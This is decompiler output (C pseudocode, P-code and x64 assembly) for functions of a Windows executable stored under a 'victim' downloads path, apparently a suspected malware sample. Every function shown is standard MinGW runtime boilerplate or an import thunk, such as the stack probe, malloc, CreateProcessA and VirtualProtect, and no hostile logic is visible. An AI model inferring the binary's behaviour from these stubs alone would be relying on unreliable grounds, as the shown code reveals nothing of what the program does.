  ulonglong in_RAX;
  ulonglong uVar1;
  undefined8 *puVar2;
  undefined8 local_res8 [4];
  
  puVar2 = local_res8;
  uVar1 = in_RAX;
  if (0xfff < in_RAX) {
    do {
      puVar2 = puVar2 + -0x200;
      *puVar2 = *puVar2;
      uVar1 = uVar1 - 0x1000;
    } while (0x1000 < uVar1);
  }
  *(undefined8 *)((longlong)puVar2 - uVar1) = *(undefined8 *)((longlong)puVar2 - uVar1);
  return in_RAX;
}



Pcode Representation:
(register, 0x200, 1) INT_LESS (const, 0xfff, 8) , (register, 0x0, 8)
(unique, 0x4b00, 8) PTRSUB (register, 0x20, 8) , (const, 0x8, 8)
(unique, 0x10000041, 8) COPY (register, 0x0, 8)
 ---  CBRANCH (ram, 0x1400026f8, 1) , (register, 0x200, 1)
(register, 0x8, 8) MULTIEQUAL (unique, 0x4b00, 8) , (register, 0x8, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x10000041, 8) , (register, 0x0, 8)
(register, 0x8, 8) PTRADD (register, 0x8, 8) , (const, 0xfffffffffffffe00, 8) , (const, 0x8, 8)
(unique, 0x6b80, 8) LOAD (const, 0x1b1, 4) , (register, 0x8, 8)
 ---  STORE (const, 0x1b1, 4) , (register, 0x8, 8) , (unique, 0x6b80, 8)
(register, 0x0, 8) INT_SUB (register, 0x0, 8) , (const, 0x1000, 8)
(unique, 0xe680, 1) INT_LESS (const, 0x1000, 8) , (register, 0x0, 8)
 ---  CBRANCH (ram, 0x1400026df, 1) , (unique, 0xe680, 1)
(register, 0x8, 8) MULTIEQUAL (unique, 0x4b00, 8) , (register, 0x8, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x10000041, 8) , (register, 0x0, 8)
(unique, 0x10000051, 8) CAST (register, 0x8, 8)
(unique, 0x10000059, 8) INT_SUB (unique, 0x10000051, 8) , (register, 0x0, 8)
(register, 0x8, 8) CAST (unique, 0x10000059, 8)
(unique, 0x6b80, 8) LOAD (const, 0x1b1, 4) , (register, 0x8, 8)
 ---  STORE (const, 0x1b1, 4) , (register, 0x8, 8) , (unique, 0x6b80, 8)
(register, 0x0, 8) COPY (register, 0x0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
PUSH RCX
PUSH RAX
CMP RAX,0x1000
LEA RCX,[RSP + 0x18]
JC 0x1400026f8
SUB RCX,0x1000
OR qword ptr [RCX],0x0
SUB RAX,0x1000
CMP RAX,0x1000
JA 0x1400026df
SUB RCX,RAX
OR qword ptr [RCX],0x0
POP RAX
POP RCX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __p__fmode
C Decompilation:

/* WARNING: Unknown calling convention */

int * __p__fmode(void)

{
  return *(int **)_refptr___imp__fmode;
}



Pcode Representation:
(unique, 0x10000000, 8) CAST (ram, 0x140004540, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000000, 8)
(register, 0x0, 8) COPY (unique, 0xdc00, 8)
(ram, 0x140004540, 8) COPY (ram, 0x140004540, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RAX,qword ptr [0x140004540]
MOV RAX,qword ptr [RAX]
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __p__commode
C Decompilation:

/* WARNING: Unknown calling convention */

int * __p__commode(void)

{
  return *(int **)_refptr___imp__commode;
}



Pcode Representation:
(unique, 0x10000000, 8) CAST (ram, 0x140004530, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000000, 8)
(register, 0x0, 8) COPY (unique, 0xdc00, 8)
(ram, 0x140004530, 8) COPY (ram, 0x140004530, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RAX,qword ptr [0x140004530]
MOV RAX,qword ptr [RAX]
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: mingw_get_invalid_parameter_handler
C Decompilation:

_invalid_parameter_handler __cdecl mingw_get_invalid_parameter_handler(void)

{
  return (_invalid_parameter_handler)handler;
}



Pcode Representation:
(unique, 0x10000000, 8) CAST (ram, 0x140007170, 8)
(register, 0x0, 8) COPY (unique, 0x10000000, 8)
(ram, 0x140007170, 8) COPY (ram, 0x140007170, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RAX,qword ptr [0x140007170]
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: mingw_set_invalid_parameter_handler
C Decompilation:

_invalid_parameter_handler __cdecl
mingw_set_invalid_parameter_handler(_invalid_parameter_handler _Handler)

{
  _invalid_parameter_handler p_Var1;
  
  p_Var1 = handler;
  LOCK();
  handler = (_invalid_parameter_handler)_Handler;
  UNLOCK();
  return (_invalid_parameter_handler)p_Var1;
}



Pcode Representation:
(unique, 0x10000000, 8) COPY (ram, 0x140007170, 8)
 ---  CALLOTHER (const, 0x11, 4)
(unique, 0x10000008, 8) CAST (register, 0x8, 8)
(ram, 0x140007170, 8) COPY (unique, 0x10000008, 8)
(unique, 0x10000010, 8) CAST (unique, 0x10000000, 8)
(register, 0x0, 8) COPY (unique, 0x10000010, 8)
 ---  CALLOTHER (const, 0x12, 4)
(ram, 0x140007170, 8) COPY (ram, 0x140007170, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RAX,RCX
XCHG qword ptr [0x140007170],RAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __acrt_iob_func
C Decompilation:

/* WARNING: Unknown calling convention */

FILE * __acrt_iob_func(uint index)

{
  FILE *pFVar1;
  
  pFVar1 = __iob_func();
  return (FILE *)(pFVar1 + index);
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x140002780, 8)
(register, 0x8, 8) INT_ZEXT (register, 0x8, 4)
(unique, 0x10000031, 8) PTRADD (register, 0x0, 8) , (register, 0x8, 8) , (const, 0x30, 8)
(register, 0x0, 8) CAST (unique, 0x10000031, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
PUSH RBX
SUB RSP,0x20
MOV EBX,ECX
CALL 0x140002780
MOV ECX,EBX
LEA RDX,[RCX + RCX*0x2]
SHL RDX,0x4
ADD RAX,RDX
ADD RSP,0x20
POP RBX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __C_specific_handler
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

EXCEPTION_DISPOSITION
__C_specific_handler
          (_EXCEPTION_RECORD *ExceptionRecord,void *EstablisherFrame,_CONTEXT *ContextRecord,
          _DISPATCHER_CONTEXT *DispatcherContext)

{
  EXCEPTION_DISPOSITION EVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002770. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EVar1 = __C_specific_handler(ExceptionRecord,EstablisherFrame,ContextRecord,DispatcherContext);
  return EVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x140008210, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8) , (register, 0x88, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x140008210]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __getmainargs
C Decompilation:

void __getmainargs(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140002778. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __getmainargs();
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008218, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008218]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __iob_func
C Decompilation:

FILE * __cdecl __iob_func(void)

{
  FILE *pFVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002780. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pFVar1 = __iob_func();
  return pFVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x140008228, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x140008228]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __set_app_type
C Decompilation:

void __cdecl __set_app_type(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140002788. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __set_app_type(param_1);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008230, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008230]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __setusermatherr
C Decompilation:

void __setusermatherr(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140002790. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __setusermatherr();
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008238, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008238]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _amsg_exit
C Decompilation:

void __cdecl _amsg_exit(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140002798. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _amsg_exit(param_1);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008240, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008240]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _cexit
C Decompilation:

void __cdecl _cexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400027a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _cexit();
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008248, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008248]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _initterm
C Decompilation:

void _initterm(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400027a8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm();
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008260, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008260]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _onexit
C Decompilation:

_onexit_t __cdecl _onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027b0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  p_Var1 = _onexit(_Func);
  return p_Var1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x140008268, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x140008268]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: abort
C Decompilation:

void __cdecl abort(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400027b8. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  abort();
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008270, 8)
 ---  RETURN (const, 0x1, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008270]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: calloc
C Decompilation:

void * __cdecl calloc(size_t _Count,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = calloc(_Count,_Size);
  return pvVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x140008278, 8) , (register, 0x8, 8) , (register, 0x10, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x140008278]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: exit
C Decompilation:

void __cdecl exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x0001400027c8. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  exit(_Code);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008280, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008280]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: fprintf
C Decompilation:

int __cdecl fprintf(FILE *_File,char *_Format,...)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = fprintf(_File,_Format);
  return iVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x140008288, 8) , (register, 0x8, 8) , (register, 0x10, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x140008288]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: free
C Decompilation:

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x0001400027d8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x140008290, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x140008290]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: fwrite
C Decompilation:

size_t __cdecl fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = fwrite(_Str,_Size,_Count,_File);
  return sVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x140008298, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8) , (register, 0x88, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x140008298]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: malloc
C Decompilation:

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027e8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = malloc(_Size);
  return pvVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400082a0, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400082a0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: memcpy
C Decompilation:

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400082a8, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400082a8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: memset
C Decompilation:

void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400027f8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400082b0, 8) , (register, 0x8, 8) , (register, 0x10, 4) , (register, 0x80, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400082b0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: signal
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void signal(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140002800. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  signal(param_1);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400082b8, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400082b8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: strlen
C Decompilation:

size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002808. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = strlen(_Str);
  return sVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400082c0, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400082c0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: strncmp
C Decompilation:

int __cdecl strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002810. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = strncmp(_Str1,_Str2,_MaxCount);
  return iVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400082c8, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400082c8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: vfprintf
C Decompilation:

int __cdecl vfprintf(FILE *_File,char *_Format,va_list _ArgList)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002818. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = vfprintf(_File,_Format,_ArgList);
  return iVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400082d0, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400082d0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: WaitForSingleObject
C Decompilation:

DWORD __stdcall WaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002820. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = WaitForSingleObject(hHandle,dwMilliseconds);
  return DVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x140008200, 8) , (register, 0x8, 8) , (register, 0x10, 4)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x140008200]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: VirtualQuery
C Decompilation:

SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)

{
  SIZE_T SVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002828. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SVar1 = VirtualQuery(lpAddress,lpBuffer,dwLength);
  return SVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400081f8, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400081f8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: VirtualProtect
C Decompilation:

BOOL __stdcall
VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002830. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = VirtualProtect(lpAddress,dwSize,flNewProtect,lpflOldProtect);
  return BVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400081f0, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 4) , (register, 0x88, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400081f0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: TlsGetValue
C Decompilation:

LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)

{
  LPVOID pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002838. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = TlsGetValue(dwTlsIndex);
  return pvVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400081e8, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400081e8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: Sleep
C Decompilation:

void __stdcall Sleep(DWORD dwMilliseconds)

{
                    /* WARNING: Could not recover jumptable at 0x000140002840. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  Sleep(dwMilliseconds);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400081e0, 8) , (register, 0x8, 4)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400081e0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: SetUnhandledExceptionFilter
C Decompilation:

LPTOP_LEVEL_EXCEPTION_FILTER __stdcall
SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)

{
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002848. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pPVar1 = SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
  return pPVar1;
}



Pcode Representation:
(register, 0x0, 8) CALL (ram, 0x1400081d8, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 8)


Native Assembly Code:
JMP qword ptr [0x1400081d8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: LeaveCriticalSection
C Decompilation:

void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    /* WARNING: Could not recover jumptable at 0x000140002850. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection(lpCriticalSection);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400081d0, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400081d0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: InitializeCriticalSection
C Decompilation:

void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    /* WARNING: Could not recover jumptable at 0x000140002858. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  InitializeCriticalSection(lpCriticalSection);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400081c8, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400081c8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: GetLastError
C Decompilation:

DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002860. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DVar1 = GetLastError();
  return DVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400081c0, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400081c0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: EnterCriticalSection
C Decompilation:

void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    /* WARNING: Could not recover jumptable at 0x000140002868. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection(lpCriticalSection);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400081b8, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400081b8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: DeleteCriticalSection
C Decompilation:

void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    /* WARNING: Could not recover jumptable at 0x000140002870. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  DeleteCriticalSection(lpCriticalSection);
  return;
}



Pcode Representation:
 ---  CALL (ram, 0x1400081b0, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
JMP qword ptr [0x1400081b0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: CreateProcessA
C Decompilation:

BOOL __stdcall
CreateProcessA(LPCSTR lpApplicationName,LPSTR lpCommandLine,
              LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,
              BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,
              LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,
              LPPROCESS_INFORMATION lpProcessInformation)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002878. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = CreateProcessA(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,
                         bInheritHandles,dwCreationFlags,lpEnvironment,lpCurrentDirectory,
                         lpStartupInfo,lpProcessInformation);
  return BVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400081a8, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8) , (register, 0x88, 8) , (stack, 0x28, 4) , (stack, 0x30, 4) , (stack, 0x38, 8) , (stack, 0x40, 8) , (stack, 0x48, 8) , (stack, 0x50, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400081a8]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: CloseHandle
C Decompilation:

BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002880. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400081a0, 8) , (register, 0x8, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400081a0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: MessageBoxA
C Decompilation:

int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140002890. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



Pcode Representation:
(register, 0x0, 4) CALL (ram, 0x1400082e0, 8) , (register, 0x8, 8) , (register, 0x10, 8) , (register, 0x80, 8) , (register, 0x88, 4)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)


Native Assembly Code:
JMP qword ptr [0x1400082e0]




